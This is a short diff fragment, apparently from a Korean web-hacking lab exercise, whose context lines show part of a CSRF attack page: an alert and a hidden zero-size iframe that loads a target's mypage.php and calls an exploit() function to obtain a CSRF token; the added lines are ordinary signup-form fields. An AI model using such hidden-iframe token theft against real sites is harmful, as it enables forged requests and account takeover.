@@ -57,3 +57,10 @@ alert("데이터 전송이 성공적으로 끝났을 때 실행");
 
 <iframe id="getCSRFToken" src="http://normaltic.com:5002/mypage.php" width="0" height="0" border="0"">
     onload=" exploit()</iframe>
+
+
+
+    <p><div class=subject>Password2</div></div><br>
+        <p><input type="text" name='login_pw2' placeholder="비밀번호" maxlength="20"/></p>
+        <p><div class=subject>주소</div><br>
+        <input class=textform type="text" name="login_addr" onclick="address();" placeholder="주소를 검색해주세요." required></p>
